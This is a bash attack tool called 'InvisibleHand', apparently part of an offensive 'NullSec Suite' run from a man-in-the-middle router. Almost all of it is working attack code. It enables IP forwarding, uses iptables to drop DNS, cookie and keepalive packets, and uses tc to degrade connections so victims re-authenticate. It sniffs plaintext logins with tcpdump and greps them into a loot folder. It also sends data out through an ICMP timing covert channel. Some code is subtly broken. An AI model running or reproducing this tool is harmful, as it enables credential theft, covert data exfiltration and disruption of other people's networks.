#!/bin/bash
#
# InvisibleHand - Passive Network Manipulation Without Active Attacks
# Manipulate networks through timing, selective dropping, and influence
# NullSec Suite | For authorized testing only
#
# UNIQUE FEATURES:
# - No active packet injection (hard to detect)
# - Selective packet dropping to influence behavior
# - Timing-based covert channels
# - Traffic shaping for behavior modification
# - Psychological network manipulation

PAYLOAD_NAME="InvisibleHand"
VERSION="1.0.0"
LOOT_DIR="/root/loot/invisiblehand"
INTERFACE="br-lan"

show_banner() {
    echo -e "\033[1;37m"
    cat << "EOF"
  _____            _     _ _     _      _   _                 _ 
 |_   _|          (_)   (_) |   | |    | | | |               | |
   | |  _ ____   ___ ___ _| |__ | | ___| |_| | __ _ _ __   __| |
   | | | '_ \ \ / / / __| | '_ \| |/ _ \  _  |/ _` | '_ \ / _` |
  _| |_| | | \ V /| \__ \ | |_) | |  __/ | | | (_| | | | | (_| |
 |_____|_| |_|\_/ |_|___/_|_.__/|_|\___|_| |_|\__,_|_| |_|\__,_|
                                                                
    [ Passive Network Manipulation Framework ]
    [ NullSec Suite v${VERSION} ]
EOF
    echo -e "\033[0m"
}

init_invisiblehand() {
    mkdir -p "$LOOT_DIR"/{logs,captures,analysis}
    
    # Enable IP forwarding (we're a man-in-the-middle)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Load iptables modules
    modprobe ip_tables
    modprobe iptable_filter
    modprobe nf_conntrack
    
    echo "[*] InvisibleHand initialized"
}

# Selective packet dropping - influence without injecting
selective_drop() {
    local target_ip=$1
    local drop_type=$2
    local drop_rate=${3:-20}  # Percentage
    
    echo "[*] Selective drop: $target_ip ($drop_type at ${drop_rate}%)"
    
    case $drop_type in
        "dns")
            # Drop DNS responses to force reconnection attempts
            iptables -A FORWARD -s "$target_ip" -p udp --sport 53 \
                -m statistic --mode random --probability $(echo "$drop_rate/100" | bc -l) \
                -j DROP
            echo "[*] Dropping ${drop_rate}% of DNS responses"
            ;;
        "auth")
            # Drop authentication packets to force re-auth
            iptables -A FORWARD -d "$target_ip" -p tcp --dport 443 \
                -m string --string "Set-Cookie" --algo bm \
                -m statistic --mode random --probability $(echo "$drop_rate/100" | bc -l) \
                -j DROP
            echo "[*] Dropping ${drop_rate}% of auth cookies"
            ;;
        "keepalive")
            # Drop keepalive packets to force disconnections
            iptables -A FORWARD -s "$target_ip" -p tcp --tcp-flags PSH PSH \
                -m length --length 0:60 \
                -m statistic --mode random --probability $(echo "$drop_rate/100" | bc -l) \
                -j DROP
            echo "[*] Dropping ${drop_rate}% of keepalives"
            ;;
        "slow")
            # Create artificial latency through queuing
            tc qdisc add dev $INTERFACE root netem delay 500ms 200ms
            echo "[*] Added 500ms±200ms latency"
            ;;
        "jitter")
            # Add jitter to destabilize connections
            tc qdisc add dev $INTERFACE root netem delay 50ms 100ms distribution pareto
            echo "[*] Added high jitter"
            ;;
    esac
    
    log_manipulation "$target_ip" "$drop_type" "$drop_rate"
}

# Traffic shaping to influence user behavior
shape_traffic() {
    local target_ip=$1
    local service=$2
    local speed=$3  # in kbit
    
    echo "[*] Shaping $service traffic for $target_ip to ${speed}kbit"
    
    # Create traffic class
    tc qdisc add dev $INTERFACE root handle 1: htb default 12
    tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 100mbit
    tc class add dev $INTERFACE parent 1:1 classid 1:10 htb rate ${speed}kbit
    
    # Match and shape based on service
    case $service in
        "streaming")
            # Slow down video streaming
            tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 \
                u32 match ip dst "$target_ip" match ip dport 443 0xffff \
                flowid 1:10
            ;;
        "social")
            # Slow down social media
            for domain in facebook.com instagram.com twitter.com tiktok.com; do
                local ip=$(dig +short $domain | head -1)
                [ -n "$ip" ] && tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 \
                    u32 match ip dst "$ip" flowid 1:10
            done
            ;;
        "all")
            tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 \
                u32 match ip dst "$target_ip" flowid 1:10
            ;;
    esac
}

# Timing-based covert channel (exfil data through packet timing)
timing_covert_channel() {
    local message=$1
    local target_ip=$2
    
    echo "[*] Sending covert message via timing..."
    
    # Encode message in packet timing
    python3 << COVERT
import time
import subprocess

message = "$message"
target = "$target_ip"

# Convert to binary
binary = ''.join(format(ord(c), '08b') for c in message)

print(f"[*] Transmitting {len(binary)} bits...")

for bit in binary:
    if bit == '1':
        # Long delay = 1
        time.sleep(0.1)
    else:
        # Short delay = 0
        time.sleep(0.02)
    
    # Send a ping (the timing between pings encodes data)
    subprocess.run(['ping', '-c', '1', '-W', '1', target], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print("[*] Transmission complete")
COVERT
}

# Receive timing-based covert channel
receive_covert_channel() {
    local duration=${1:-30}
    
    echo "[*] Listening for covert timing channel..."
    
    python3 << 'RECEIVE'
import time
from scapy.all import sniff, ICMP

packets = []
start_time = None

def process_packet(pkt):
    global start_time, packets
    if pkt.haslayer(ICMP):
        if start_time is None:
            start_time = time.time()
        packets.append(time.time())

print("[*] Sniffing for ICMP packets...")
sniff(filter="icmp", prn=process_packet, timeout=DURATION, store=0)

# Decode timing
if len(packets) > 1:
    binary = ""
    for i in range(1, len(packets)):
        interval = packets[i] - packets[i-1]
        if interval > 0.05:  # Threshold between 0 and 1
            binary += "1"
        else:
            binary += "0"
    
    # Convert binary to ASCII
    message = ""
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))
    
    print(f"[*] Decoded message: {message}")
else:
    print("[*] No covert channel detected")
RECEIVE
}

# Influence user to reconnect (psychological manipulation)
influence_reconnect() {
    local target_ip=$1
    
    echo "[*] Influencing target to reconnect..."
    
    # Strategy: Make current connection unreliable without breaking it
    # User will voluntarily reconnect thinking it's their issue
    
    # 1. Introduce subtle latency
    tc qdisc add dev $INTERFACE root netem delay 200ms 50ms
    sleep 30
    
    # 2. Increase latency gradually
    tc qdisc change dev $INTERFACE root netem delay 500ms 100ms
    sleep 30
    
    # 3. Add packet loss
    tc qdisc change dev $INTERFACE root netem delay 300ms loss 5%
    sleep 30
    
    # 4. Return to normal (user reconnects thinking they fixed it)
    tc qdisc del dev $INTERFACE root 2>/dev/null
    
    echo "[*] Influence cycle complete"
}

# Capture credentials through induced re-authentication
passive_cred_harvest() {
    local interface=${1:-$INTERFACE}
    
    echo "[*] Passive credential harvesting (waiting for re-auths)..."
    
    # Don't inject - just capture when users naturally re-authenticate
    # or when our subtle influence causes re-auth
    
    tcpdump -i $interface -A -s 0 \
        'tcp port 80 or tcp port 8080 or tcp port 443' 2>/dev/null | \
        grep -iE 'pass=|password=|pwd=|user=|login=|email=' | \
        tee "$LOOT_DIR/captures/creds_$(date +%s).txt"
}

# Analyze traffic patterns without injection
passive_analysis() {
    local target_ip=$1
    local duration=${2:-60}
    
    echo "[*] Passive traffic analysis for $target_ip ($duration seconds)"
    
    tcpdump -i $INTERFACE -c 10000 host "$target_ip" -w "$LOOT_DIR/captures/analysis_$(date +%s).pcap" &
    local tcpdump_pid=$!
    
    sleep "$duration"
    kill $tcpdump_pid 2>/dev/null
    
    # Analyze
    python3 << ANALYZE
from scapy.all import rdpcap
from collections import Counter
import json

try:
    packets = rdpcap("$LOOT_DIR/captures/analysis_*.pcap"[-1])
    
    analysis = {
        "total_packets": len(packets),
        "protocols": Counter(),
        "destinations": Counter(),
        "ports": Counter(),
        "timing": {
            "first": str(packets[0].time) if packets else None,
            "last": str(packets[-1].time) if packets else None
        }
    }
    
    for pkt in packets:
        if hasattr(pkt, 'proto'):
            analysis["protocols"][str(pkt.proto)] += 1
        if hasattr(pkt, 'dst'):
            analysis["destinations"][pkt.dst] += 1
        if hasattr(pkt, 'dport'):
            analysis["ports"][str(pkt.dport)] += 1
    
    # Convert counters to dicts for JSON
    analysis["protocols"] = dict(analysis["protocols"].most_common(10))
    analysis["destinations"] = dict(analysis["destinations"].most_common(10))
    analysis["ports"] = dict(analysis["ports"].most_common(10))
    
    print(json.dumps(analysis, indent=2))
except Exception as e:
    print(f"Analysis error: {e}")
ANALYZE
}

# Log all manipulations
log_manipulation() {
    local target=$1
    local type=$2
    local param=$3
    
    echo "$(date -Iseconds)|$target|$type|$param" >> "$LOOT_DIR/logs/manipulations.log"
}

# Clear all manipulations
clear_manipulations() {
    echo "[*] Clearing all manipulations..."
    
    # Clear iptables rules
    iptables -F FORWARD
    
    # Clear traffic shaping
    tc qdisc del dev $INTERFACE root 2>/dev/null
    
    echo "[*] All manipulations cleared"
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo ""
        echo "1) Initialize InvisibleHand"
        echo "2) Selective Packet Dropping"
        echo "3) Traffic Shaping"
        echo "4) Influence Reconnection"
        echo "5) Passive Credential Harvest"
        echo "6) Passive Traffic Analysis"
        echo "7) Timing Covert Channel (Send)"
        echo "8) Timing Covert Channel (Receive)"
        echo "9) Clear All Manipulations"
        echo "0) Exit"
        echo ""
        read -p "[InvisibleHand]> " choice
        
        case $choice in
            1) init_invisiblehand ;;
            2)
                read -p "Target IP: " target
                echo "Drop types: dns, auth, keepalive, slow, jitter"
                read -p "Drop type: " dtype
                read -p "Drop rate % (default 20): " rate
                selective_drop "$target" "$dtype" "${rate:-20}"
                ;;
            3)
                read -p "Target IP: " target
                echo "Services: streaming, social, all"
                read -p "Service to shape: " service
                read -p "Speed limit (kbit): " speed
                shape_traffic "$target" "$service" "$speed"
                ;;
            4)
                read -p "Target IP: " target
                influence_reconnect "$target"
                ;;
            5) passive_cred_harvest ;;
            6)
                read -p "Target IP: " target
                read -p "Duration (seconds): " dur
                passive_analysis "$target" "${dur:-60}"
                ;;
            7)
                read -p "Message to send: " msg
                read -p "Target IP: " target
                timing_covert_channel "$msg" "$target"
                ;;
            8)
                read -p "Listen duration (seconds): " dur
                receive_covert_channel "${dur:-30}"
                ;;
            9) clear_manipulations ;;
            0)
                clear_manipulations
                exit 0
                ;;
        esac
    done
}

main_menu
